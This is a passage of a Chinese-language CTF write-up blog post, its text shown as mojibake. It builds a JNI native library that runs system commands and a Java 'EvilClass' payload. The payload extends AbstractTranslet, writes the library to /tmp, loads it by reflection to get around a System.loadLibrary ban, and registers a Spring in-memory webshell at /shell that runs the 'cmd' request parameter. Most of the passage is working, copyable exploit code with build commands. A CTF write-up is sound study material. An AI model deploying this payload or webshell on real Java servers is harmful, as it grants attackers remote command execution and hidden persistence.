class="line">        &#123; <span class="comment">//å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­</span></span><br><span class="line">            <span class="built_in">strcat</span>(result, buffer);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pclose(pipe); <span class="comment">//å…³é—­ç®¡é“</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;      <span class="comment">//è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªç¼“å†²åŒº,<code>popen</code>æ˜¯Cä¸­æ‰§è¡Œå‘½ä»¤æ—¶æ‰“å¼€çš„ä¸€ä¸ªç®¡é“,ä»¥åªè¯»æ¨¡å¼æ‰“å¼€.å¦‚æœä¸ºç©º,åˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥,è¿”å›.</p>
<p>åŒæ—¶whileä½¿ç”¨feofæ£€æµ‹pipeçŠ¶æ€,æœªç»“æŸå°±æŒç»­ä»pipeé‡Œé¢æ¯æ¬¡æœ€å¤§è·å–128ä¸ªå­—èŠ‚å†…å®¹,æ”¾åˆ°ç¼“å†²åŒº,ç„¶åå°†ç»“æœè¿½åŠ åˆ°<code>result</code>ä¸­.</p>
<p>éšå</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">JNIEXPORT jstring JNICALL <span class="title function_">Java_EvilClass_execCmd</span><span class="params">(JNIEnv *env, jclass class_object, jstring jstr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, <span class="literal">NULL</span>); <span class="comment">// è·å– Java å­—ç¬¦ä¸² jstr çš„ UTF-8 ç¼–ç </span></span><br><span class="line">    <span class="type">char</span> result[<span class="number">1024</span> * <span class="number">12</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå­˜æ”¾å‘½ä»¤æ‰§è¡Œç»“æœçš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">1</span> == execmd(cstr, result)) <span class="comment">// è°ƒç”¨ä¹‹å‰å®šä¹‰çš„ execmd å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€äº›å¤„ç†ï¼Œä½†ä»£ç ä¸­è¢«æ³¨é‡Šæ‰äº†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> return_messge[<span class="number">100</span>] = <span class="string">&quot;&quot;</span>; <span class="comment">// å®šä¹‰ä¸€ä¸ªå­˜æ”¾è¿”å›æ¶ˆæ¯çš„å­—ç¬¦æ•°ç»„</span></span><br><span class="line">    <span class="built_in">strcat</span>(return_messge, result); <span class="comment">// å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿½åŠ åˆ°è¿”å›æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); <span class="comment">// åˆ›å»ºä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cmdresult; <span class="comment">// è¿”å› Java å­—ç¬¦ä¸²ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="JNIè§„èŒƒ"><a href="#JNIè§„èŒƒ" class="headerlink" title="JNIè§„èŒƒ"></a>JNIè§„èŒƒ</h3><p><strong>JNIåŸå‹å‡½æ•°ï¼š</strong> JNIè§„èŒƒå®šä¹‰äº†ä¸€ç»„æ ‡å‡†çš„JNIå‡½æ•°åŸå‹ï¼Œå¦‚<code>GetStringUTFChars</code>ã€<code>ReleaseStringUTFChars</code>ç­‰ï¼Œä»¥æ–¹ä¾¿æ“ä½œå­—ç¬¦ä¸²ã€æ•°ç»„ã€å¼•ç”¨ç­‰å¸¸è§ä»»åŠ¡ã€‚</p>
<p><strong>JNIå‡½æ•°å‘½åè§„èŒƒï¼š</strong> JNIå‡½æ•°çš„å‘½åå¿…é¡»éµå¾ªç‰¹å®šçš„å‘½åè§„èŒƒï¼Œé€šå¸¸æ˜¯Javaç±»åï¼ˆç”¨ä¸‹åˆ’çº¿æ›¿ä»£ç‚¹å·ï¼‰åè·ŸJavaæ–¹æ³•åã€‚ä¾‹å¦‚ï¼ŒJavaç±»<code>com.example.MyClass</code>ä¸­çš„æ–¹æ³•<code>myNativeFunction</code>å¯¹åº”çš„JNIå‡½æ•°åº”ä¸º<code>Java_com_example_MyClass_myNativeFunction</code>ã€‚</p>
<p><strong>JNIEnvæŒ‡é’ˆï¼š</strong> JNIå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ª<code>JNIEnv</code>æŒ‡é’ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªå…³äºJNIç¯å¢ƒçš„ä¸Šä¸‹æ–‡ã€‚é€šè¿‡<code>JNIEnv</code>ï¼ŒJNIå‡½æ•°å¯ä»¥è®¿é—®Javaè™šæ‹Ÿæœºçš„å„ç§åŠŸèƒ½ï¼Œå¦‚å¯¹è±¡åˆ›å»ºã€æ–¹æ³•è°ƒç”¨å’Œå¼‚å¸¸å¤„ç†ã€‚</p>
<p><strong>æ•°æ®ç±»å‹è½¬æ¢ï¼š</strong> JNIå®šä¹‰äº†å„ç§æ•°æ®ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œä»¥ä¾¿Javaå’Œæœ¬åœ°ä»£ç ä¹‹é—´çš„æ•°æ®ä¼ é€’ã€‚ä¾‹å¦‚ï¼ŒJavaçš„<code>int</code>å¯¹åº”JNIçš„<code>jint</code>ï¼ŒJavaçš„<code>String</code>å¯¹åº”JNIçš„<code>jstring</code>ç­‰ã€‚JNIå‡½æ•°å…è®¸åœ¨è¿™äº›æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚</p>
<p>ä»å‚æ•°ä¸Šçœ‹:å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼š<code>JNIEnv *env</code>ï¼ˆJNI ç¯å¢ƒæŒ‡é’ˆï¼‰ã€<code>jclass class_object</code>ï¼ˆè¡¨ç¤º Java ç±»çš„ç±»å¯¹è±¡ï¼‰ã€<code>jstring jstr</code>ï¼ˆä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼‰ã€‚</p>
<p>é€šè¿‡ <code>(*env)-&gt;GetStringUTFChars</code> å‡½æ•°å°† Java å­—ç¬¦ä¸² <code>jstr</code> è½¬æ¢ä¸º C å­—ç¬¦ä¸² <code>cstr</code>ï¼Œè¿™æ˜¯å› ä¸º <code>execmd</code> å‡½æ•°éœ€è¦æ¥å— C å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚</p>
<p>ä¸­é—´æ‰§è¡Œå‘½ä»¤,å­˜å‚¨.</p>
<p>ä½¿ç”¨ <code>(*env)-&gt;NewStringUTF</code> å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ Java å­—ç¬¦ä¸² <code>cmdresult</code>ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ã€‚</p>
<p>å°†ä¸¤éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·,å½¢æˆcæ–‡ä»¶,ç„¶åç¼–è¯‘</p>
<p>ç¼–è¯‘:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.c</span><br><span class="line">base64 -w <span class="number">0</span> libcmd.so &gt; Evil.txt</span><br></pre></td></tr></table></figure>

<p>å†™æ–‡ä»¶çš„æ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆå†™ä¸ªloadçš„å†…å­˜ğŸ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.RandomAccessFile;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.Base64;</span><br><span class="line">import java.util.Vector;</span><br><span class="line"></span><br><span class="line">public <span class="class"><span class="keyword">class</span> <span class="title">EvilClass</span> <span class="title">extends</span> <span class="title">AbstractTranslet</span> &#123;</span></span><br><span class="line">    public <span class="type">static</span> native String <span class="title function_">execCmd</span><span class="params">(String cmd)</span>;</span><br><span class="line">    private <span class="type">static</span> final String EVIL_JNI_BASE64 = <span class="string">&quot;&quot;</span>;<span class="comment">//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ</span></span><br><span class="line">    private <span class="type">static</span> final String LIB_PATH = <span class="string">&quot;/tmp/libcmd.so&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> &#123;</span><br><span class="line"></span><br><span class="line">        try&#123;</span><br><span class="line">            byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64);</span><br><span class="line">            RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, <span class="string">&quot;rw&quot;</span>);</span><br><span class="line">            randomAccessFile.write(jniBytes);</span><br><span class="line">            randomAccessFile.close();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“</span></span><br><span class="line">            ClassLoader cmdLoader = EvilClass.class.getClassLoader();</span><br><span class="line">            Class&lt;?&gt; classLoaderClazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; nativeLibraryClazz = Class.forName(<span class="string">&quot;java.lang.ClassLoader$NativeLibrary&quot;</span>);</span><br><span class="line">            Method load = nativeLibraryClazz.getDeclaredMethod(<span class="string">&quot;load&quot;</span>, String.class, boolean.class);</span><br><span class="line"></span><br><span class="line">            load.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Field field = classLoaderClazz.getDeclaredField(<span class="string">&quot;nativeLibraries&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader);</span><br><span class="line">            Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class);</span><br><span class="line">            nativeLibraryCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line">            libs.addElement(nativeLibraryObj);</span><br><span class="line">            field.<span class="built_in">set</span>(cmdLoader, libs);</span><br><span class="line">            load.invoke(nativeLibraryObj, LIB_PATH, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//å†™å…¥å†…å­˜é©¬</span></span><br><span class="line">            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line">            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">            Field configField = mappingHandlerMapping.getClass().getDeclaredField(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">            configField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            RequestMappingInfo.BuilderConfiguration config =</span><br><span class="line">                    (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);</span><br><span class="line">            Method method2 = EvilClass.class.getMethod(<span class="string">&quot;shell&quot;</span>, HttpServletRequest.class, HttpServletResponse.class);</span><br><span class="line">            RequestMappingInfo info = RequestMappingInfo.paths(<span class="string">&quot;/shell&quot;</span>)</span><br><span class="line">                    .options(config)</span><br><span class="line">                    .build();</span><br><span class="line">            EvilClass springControllerMemShell = new EvilClass();</span><br><span class="line">            mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">shell</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        String cmd = request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != null) &#123;</span><br><span class="line">            String execRes = EvilClass.execCmd(cmd);</span><br><span class="line">            response.getWriter().write(execRes);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public <span class="type">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>NativeLibrary</code>åŒ…è£…åˆ°Vector,Vectoræ˜¯<code>Classloader</code>ä¸­<code>nativeLibraries</code>çš„å€¼,</p>
<p>ä¸€èˆ¬æ¥è¯´ç”¨</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Command command = new Command();</span><br><span class="line">        String ipconfig = command.exec(<span class="string">&quot;ipconfig&quot;</span>);</span><br><span class="line">        System.out.println(ipconfig);</span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®banäº†.</p>
<p><img src="D:\localmd\image\å¾®ä¿¡æˆªå›¾_20231106155628.png" alt="å¾®ä¿¡æˆªå›¾_20231106155628"></p>
<p>èŠœæ¹–,çœŸâˆšâ…§çˆ½,âˆšâ…§çœŸçˆ½,ç»ˆå‡ºäº†.</p>
<p>æéº»éº»åœ°,ğŸ‘´èŠ±äº†å‡ å¤©æ—¶é—´,å­¦äº†ä¸€å †ä¸œè¥¿.</p>
<p>æ€ä¹ˆåˆ¶ä½œé“¾å­,æ€ä¹ˆpythonå‘åŒ…,ğŸ‘´åœ¨å‰é¢å·²ç»åˆ†æè¿‡äº†.ä¸ç”¨é—®äº†ğŸ˜…</p>

      </section>

      
      
        <nav class="article-nav">
          
          
            <div class="article-nav-item layout-padding">
  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
    
    <div class="card-text">
      
        <a href="/2023/11/29/hello-world/" itemprop="url">
          <h2 class="card-text--title text-ellipsis">Hello World</h2>
        </a>
      
      <div class="card-text--row">Older</div>
    </div>
  </article>
</div>
          
        </nav>
      

      <section class="page-message-container layout-padding">
        


  
  

  
  


      </section>
    </div>
    <div class="widget-info">
      <section class="widget-author widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-body">
    
      <img src="https://s.gravatar.com/avatar/2d6b803eea37de0257620d5fabee7e64?s=200&amp;r=g&amp;d=retro" class="soft-size--round soft-style--box" alt="Sukoshi">
    
    
      <h2>Sukoshi</h2>
    
    
      <p>è´µåœ¨åšæŒ</p>
    

    <div class="count-box">
      <div class="count-box--item">
        <svg class="icon icon-article" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M240.51564747 647.74217627h196.07203239c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806V165.10332731c0-33.18142087-30.16492806-60.32985613-60.32985612-60.32985611H245.04038668C225.43318342 104.7734712 210.35071939 119.85593522 210.35071939 139.46313845V617.57724821c0 16.59071043 13.57421762 30.16492806 30.16492808 30.16492806z m663.62841731-452.47392089v482.63884894c0 33.18142087-27.14843525 60.32985613-60.32985612 60.32985613H180.18579134c-33.18142087 0-60.32985613-27.14843525-60.32985612-60.32985613V195.26825538c-49.77213131 0-90.49478418 40.72265287-90.49478417 90.49478417v452.4739209c0 49.77213131 40.72265287 90.49478418 90.49478417 90.49478417h286.56681657c16.59071043 0 30.16492806 13.57421762 30.16492807 30.16492807s13.57421762 30.16492806 30.16492805 30.16492806h90.49478418c16.59071043 0 30.16492806-13.57421762 30.16492805-30.16492806s13.57421762-30.16492806 30.16492807-30.16492807h286.56681657c49.77213131 0 90.49478418-40.72265287 90.49478417-90.49478417V285.76303955c0-49.77213131-40.72265287-90.49478418-90.49478417-90.49478417zM587.41232014 647.74217627h191.54729318c19.60720323 0 34.68966726-15.08246403 34.68966729-34.68966727V134.93839925c0-16.59071043-13.57421762-30.16492806-30.16492808-30.16492805H617.57724821c-30.16492806 0-60.32985613 27.14843525-60.32985612 60.32985611v452.4739209c0 16.59071043 13.57421762 30.16492806 30.16492805 30.16492806z" fill="currentColor"></path>
</svg>
        <span>2</span>
      </div>
      <div class="count-box--item">
        <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
        0
      </div>
      <div class="count-box--item">
        <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
        0
      </div>
    </div>
  </div>
</section>

      

      
<section class="widet-notice widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-notice" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M512 945.02305225v28.15620663a24.27259221 24.27259221 0 0 1-24.27259221 24.27259335H394.0352a48.54518557 48.54518557 0 0 1-41.74885888-23.78714112l-110.68302222-184.47170332a132.04290333 132.04290333 0 0 1-17.47626667-48.54518557h118.4502511a200.97706667 200.97706667 0 0 1 76.21594113 14.56355556l20.38897777 133.49925888a48.54518557 48.54518557 0 0 0 36.40888888 27.67075555l16.01991111 2.91271112a24.27259221 24.27259221 0 0 1 20.38897778 25.72894889zM997.45185223 463.45481443a194.18074112 194.18074112 0 0 1-38.8361489 116.50844445 24.75804445 24.75804445 0 0 1-36.4088889 0l-34.95253333-34.95253333a24.27259221 24.27259221 0 0 1-2.91271111-30.58346667 97.09036999 97.09036999 0 0 0 0-106.79940665 24.27259221 24.27259221 0 0 1 2.91271111-30.58346666l34.95253333-34.95253334a24.75804445 24.75804445 0 0 1 18.93262223-7.28177777 26.2144 26.2144 0 0 1 17.47626667 9.70903665A194.18074112 194.18074112 0 0 1 997.45185223 463.45481443z m-194.18074112-388.36148111v776.72296335a48.54518557 48.54518557 0 0 1-48.54518556 48.54518443h-28.64165888a48.54518557 48.54518557 0 0 1-33.98163001-14.07810332l-145.63555556-143.20829668A291.27111111 291.27111111 0 0 0 342.57730333 657.63555556H172.18370333a145.63555556 145.63555556 0 0 1-145.63555556-145.63555556v-97.09036999a145.63555556 145.63555556 0 0 1 145.63555556-145.63555556h170.3936a291.27111111 291.27111111 0 0 0 206.31703779-85.43952668l145.63555555-143.20829554a48.54518557 48.54518557 0 0 1 33.98162888-14.07810446H754.72592555a48.54518557 48.54518557 0 0 1 48.54518556 48.54518555z" fill="currentColor"></path>
</svg>
    <span>NOTICE</span>
  </div>
  <div class="widget-body">
    <p>flex-blockä¸»é¢˜éƒ¨åˆ†é‡æ„ï¼Œè¯¦æƒ…æŸ¥çœ‹https://github.com/miiiku/flex-block</p>
  </div>
</section>


      <section class="widget-categorys widget-item layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-categories" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M900.3614811 257.09082106h-339.81629553l-67.96326003-101.9448889c-19.41807444-29.12711113-48.54518557-43.69066667-82.52681443-43.69066667H123.6385189c-53.39970333 0-97.09036999 43.69066667-97.09037113 97.09036999v582.54222222c0 53.39970333 43.69066667 97.09036999 97.09037113 97.09037002h776.7229622c53.39970333 0 97.09036999-43.69066667 97.09037113-97.09037002V354.18119104c0-53.39970333-43.69066667-97.09036999-97.09037113-97.09036998z m-97.09036999 242.72592554H220.72888889c-24.27259221 0-48.54518557-24.27259221-48.54518556-48.54518556s24.27259221-48.54518557 48.54518556-48.54518444h582.54222222c24.27259221 0 48.54518557 24.27259221 48.54518556 48.54518444s-24.27259221 48.54518557-48.54518556 48.54518556z" fill="currentColor"></path>
</svg>
    <span>CATEGORYS</span>
  </div>
  <div class="widget-body">
    <ul class="categorys-list">
      
    </ul>
  </div>
</section>

      <section class="widget-tags widget-item  layout-margin content-padding--primary soft-size--large soft-style--box">
  <div class="widget-title">
    <svg class="icon icon-tags" viewBox="0 0 1098 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M283.42180005 272q0-28.38857157-20.09142843-48.48000001t-48.47999998-20.09142842-48.48000002 20.09142842-20.09142846 48.48000001 20.09142846 48.48 48.48000002 20.09142843 48.47999998-20.09142843 20.09142843-48.48zM855.0332285 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.03999997 263.58857157q-20.9142853 19.81714313-48.75428534 19.81714312-28.38857157 0-48.20571468-19.81714312l-383.04-383.58857157q-20.36571468-19.81714313-34.55999999-54.10285688t-14.19428534-62.6742853l0-222.85714313q0-27.84000002 20.36571469-48.20571469t48.2057147-20.36571466l222.85714313 0q28.38857157 0 62.6742853 14.19428529t54.65142842 34.55999999l383.04000001 382.49142843q19.81714313 20.9142853 19.81714314 48.75428532zM1060.74751475 580.57142843q0 28.38857157-19.81714313 48.2057147l-263.04 263.58857157q-20.9142853 19.81714313-48.75428531 19.81714312-19.26857155 0-31.61142843-7.47428531t-28.38857159-24.13714314l251.79428534-251.7942853q19.81714313-19.81714313 19.81714308-48.20571469 0-27.84000002-19.81714308-48.75428531l-383.04000001-382.49142845q-20.36571468-20.36571468-54.65142842-34.55999999t-62.67428532-14.19428534l120 0q28.38857157 0 62.67428532 14.19428534t54.65142842 34.55999999l383.03999998 382.49142845q19.81714313 20.9142853 19.81714314 48.75428531z" fill="currentColor"></path>
</svg>
    <span>TAGS</span>
  </div>
  <div class="widget-body">
    <div class="tags-cloud">
      
    </div>
  </div>
</section>
    </div>
  </article>
</div>

    <!-- footer container -->
<footer id="footer" class="footer">
  <div class="footer-container">
    
    <div class="social-icons">
      
        
      
        
      
        
      
        
          <a href="https://github.com/miiiku/" class="soft-size--primary soft-style--box" target="_blank" rel="noopener noreferrer">
            <svg class="icon icon-github" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
